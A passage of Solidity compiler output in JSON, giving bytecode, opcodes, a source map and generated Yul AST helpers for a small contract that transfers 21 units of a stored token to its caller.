									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506040516103ba3803806103ba8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b600081519050610087816100e8565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100c8565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6100f1816100b6565b81146100fc57600080fd5b50565b6102ac8061010e6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631191c0871461003b578063fc0c546a14610045575b600080fd5b610043610063565b005b61004d610120565b60405161005a91906101d8565b60405180910390f35b600033905060006015905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb83836040518363ffffffff1660e01b81526004016100c99291906101af565b602060405180830381600087803b1580156100e357600080fd5b505af11580156100f7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011b9190610159565b505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000815190506101538161025f565b92915050565b60006020828403121561016b57600080fd5b600061017984828501610144565b91505092915050565b61018b816101f3565b82525050565b61019a8161023b565b82525050565b6101a981610231565b82525050565b60006040820190506101c46000830185610182565b6101d160208301846101a0565b9392505050565b60006020820190506101ed6000830184610191565b92915050565b60006101fe82610211565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102468261024d565b9050919050565b600061025882610211565b9050919050565b61026881610205565b811461027357600080fd5b5056fea2646970667358221220baa141757f5ecfb978f508cb70f7619c7ac1a347ea0d098642829fa08bf4c46464736f6c63430008010033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x3BA CODESIZE SUB DUP1 PUSH2 0x3BA DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x8D JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x87 DUP2 PUSH2 0xE8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x9F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xAD DUP5 DUP3 DUP6 ADD PUSH2 0x78 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC1 DUP3 PUSH2 0xC8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF1 DUP2 PUSH2 0xB6 JUMP JUMPDEST DUP2 EQ PUSH2 0xFC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x2AC DUP1 PUSH2 0x10E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1191C087 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xFC0C546A EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5A SWAP2 SWAP1 PUSH2 0x1D8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 CALLER SWAP1 POP PUSH1 0x0 PUSH1 0x15 SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB DUP4 DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC9 SWAP3 SWAP2 SWAP1 PUSH2 0x1AF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x11B SWAP2 SWAP1 PUSH2 0x159 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x153 DUP2 PUSH2 0x25F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x16B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x179 DUP5 DUP3 DUP6 ADD PUSH2 0x144 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x18B DUP2 PUSH2 0x1F3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x19A DUP2 PUSH2 0x23B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1A9 DUP2 PUSH2 0x231 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x1C4 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x182 JUMP JUMPDEST PUSH2 0x1D1 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x1A0 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1ED PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x191 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1FE DUP3 PUSH2 0x211 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x246 DUP3 PUSH2 0x24D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x258 DUP3 PUSH2 0x211 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x268 DUP2 PUSH2 0x205 JUMP JUMPDEST DUP2 EQ PUSH2 0x273 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xBA LOG1 COINBASE PUSH22 0x7F5ECFB978F508CB70F7619C7AC1A347EA0D09864282 SWAP16 LOG0 DUP12 DELEGATECALL 0xC4 PUSH5 0x64736F6C63 NUMBER STOP ADDMOD ADD STOP CALLER ",
							"sourceMap": "102:294:1:-:0;;;152:73;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;210:6;196:5;;:21;;;;;;;;;;;;;;;;;;152:73;102:294;;7:143:2;;95:6;89:13;80:22;;111:33;138:5;111:33;:::i;:::-;70:80;;;;:::o;156:284::-;;275:2;263:9;254:7;250:23;246:32;243:2;;;291:1;288;281:12;243:2;334:1;359:64;415:7;406:6;395:9;391:22;359:64;:::i;:::-;349:74;;305:128;233:207;;;;:::o;446:96::-;;512:24;530:5;512:24;:::i;:::-;501:35;;491:51;;;:::o;548:126::-;;625:42;618:5;614:54;603:65;;593:81;;;:::o;680:122::-;753:24;771:5;753:24;:::i;:::-;746:5;743:35;733:2;;792:1;789;782:12;733:2;723:79;:::o;102:294:1:-;;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2252:2",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "67:77:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "77:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "92:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "86:5:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "86:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "77:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "132:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "108:23:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "108:30:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "108:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "45:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "53:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "61:5:2",
														"type": ""
													}
												],
												"src": "7:137:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "224:204:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "270:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "279:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "282:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "272:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "272:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "272:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "245:7:2"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "254:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "241:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "241:23:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "266:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "237:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "237:32:2"
															},
															"nodeType": "YulIf",
															"src": "234:2:2"
														},
														{
															"nodeType": "YulBlock",
															"src": "296:125:2",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "311:15:2",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "325:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "315:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "340:71:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "383:9:2"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "394:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "379:3:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "379:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "403:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "350:28:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "350:61:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "340:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "194:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "205:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "217:6:2",
														"type": ""
													}
												],
												"src": "150:278:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "499:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "516:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "539:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "521:17:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "521:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "509:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "509:37:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "509:37:2"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "487:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "494:3:2",
														"type": ""
													}
												],
												"src": "434:118:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "635:78:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "652:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "700:5:2"
																			}
																		],
																		"functionName": {
																			"name": "convert_t_contract$_Token_$71_to_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "657:42:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "657:49:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "645:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "645:62:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "645:62:2"
														}
													]
												},
												"name": "abi_encode_t_contract$_Token_$71_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "623:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "630:3:2",
														"type": ""
													}
												],
												"src": "558:155:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "784:53:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "801:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "824:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "806:17:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "806:24:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "794:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "794:37:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "794:37:2"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "772:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "779:3:2",
														"type": ""
													}
												],
												"src": "719:118:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "969:206:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "979:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "991:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1002:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "987:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "987:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "979:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1059:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1072:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1083:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1068:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1068:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1015:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1015:71:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1015:71:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value1",
																		"nodeType": "YulIdentifier",
																		"src": "1140:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1153:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1164:2:2",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1149:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1149:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1096:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1096:72:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1096:72:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "933:9:2",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "945:6:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "953:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "964:4:2",
														"type": ""
													}
												],
												"src": "843:332:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1291:136:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1301:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1313:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1324:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1309:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1309:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1301:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1393:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1406:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1417:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1402:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1402:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_contract$_Token_$71_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1337:55:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1337:83:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1337:83:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_contract$_Token_$71__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1263:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1275:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1286:4:2",
														"type": ""
													}
												],
												"src": "1181:246:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1478:51:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1488:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1517:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "1499:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1499:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1488:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1460:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1470:7:2",
														"type": ""
													}
												],
												"src": "1433:96:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1577:48:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1587:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1612:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1605:6:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1605:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1598:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1598:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1587:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1559:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1569:7:2",
														"type": ""
													}
												],
												"src": "1535:90:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1676:81:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1686:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1701:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1708:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "1697:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1697:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1686:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1658:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1668:7:2",
														"type": ""
													}
												],
												"src": "1631:126:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1808:32:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1818:16:2",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1829:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1818:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1790:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1800:7:2",
														"type": ""
													}
												],
												"src": "1763:77:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1918:78:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1928:62:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1984:5:2"
																	}
																],
																"functionName": {
																	"name": "convert_t_contract$_Token_$71_to_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "1941:42:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1941:49:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nodeType": "YulIdentifier",
																	"src": "1928:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_contract$_Token_$71_to_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1898:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nodeType": "YulTypedName",
														"src": "1908:9:2",
														"type": ""
													}
												],
												"src": "1846:150:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2074:53:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2084:37:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2115:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "2097:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2097:24:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nodeType": "YulIdentifier",
																	"src": "2084:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_contract$_Token_$71_to_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2054:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nodeType": "YulTypedName",
														"src": "2064:9:2",
														"type": ""
													}
												],
												"src": "2002:125:2"
											},
											{
